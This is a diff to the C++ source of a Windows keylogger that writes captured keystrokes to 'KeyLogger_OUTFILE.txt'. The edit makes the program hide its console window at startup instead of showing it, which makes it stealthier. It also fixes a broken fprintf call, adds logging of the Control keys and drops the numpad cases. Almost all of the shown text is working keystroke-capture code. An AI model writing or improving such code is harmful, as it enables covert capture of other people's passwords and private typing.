@@ -1,5 +1,5 @@
 #define PATH "..\\KeyLogger_OUTFILE.txt"  // path to output file location
-#define KEY_PRESSED -32767 
+#define KEY_PRESSED -32767
 #include <iostream>
 #include <cstdio>
 #include <Windows.h>
@@ -11,7 +11,7 @@ void saveToFile(int key_ascii);
 
 int main()
 {
-	showConsole();
+	hideConsole();
 	while (true)
 	{
 		Sleep(20);
@@ -53,7 +53,13 @@ void saveToFile(int key_ascii)
 		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
 		break;
 	case VK_DELETE:
-		fprintf(OUTPUT_FILE, "%s" "[DELETE]");
+		fprintf(OUTPUT_FILE, "%s", "[DELETE]");
+		break;
+	case VK_LCONTROL:
+		fprintf(OUTPUT_FILE, "%s", "[LEFT CONTROL]");
+		break;
+	case VK_RCONTROL:
+		fprintf(OUTPUT_FILE, "%s", "[RIGHT CONTROL]");
 		break;
 	case VK_LSHIFT:
 		fprintf(OUTPUT_FILE, "%s", "[LEFT SHIFT]");
@@ -72,33 +78,6 @@ void saveToFile(int key_ascii)
 		break;
 	case VK_RBUTTON:
 		fprintf(OUTPUT_FILE, "%s", "[RIGHT MOUSE BUTTON]");
-		break;
-	case VK_NUMPAD1:
-		fprintf(OUTPUT_FILE, "%s", "1");
-		break;
-	case VK_NUMPAD2:
-		fprintf(OUTPUT_FILE, "%s", "2");
-		break;
-	case VK_NUMPAD3:
-		fprintf(OUTPUT_FILE, "%s", "3");
-		break;
-	case VK_NUMPAD4:
-		fprintf(OUTPUT_FILE, "%s", "4");
-		break;
-	case VK_NUMPAD5:
-		fprintf(OUTPUT_FILE, "%s", "5");
-		break;
-	case VK_NUMPAD6:
-		fprintf(OUTPUT_FILE, "%s", "6");
-		break;
-	case VK_NUMPAD7:
-		fprintf(OUTPUT_FILE, "%s", "7");
-		break;
-	case VK_NUMPAD8:
-		fprintf(OUTPUT_FILE, "%s", "8");
-		break;
-	case VK_NUMPAD9:
-		fprintf(OUTPUT_FILE, "%s", "9");
 		break;
 	default:
 		fprintf(OUTPUT_FILE, "%s", &key_ascii);
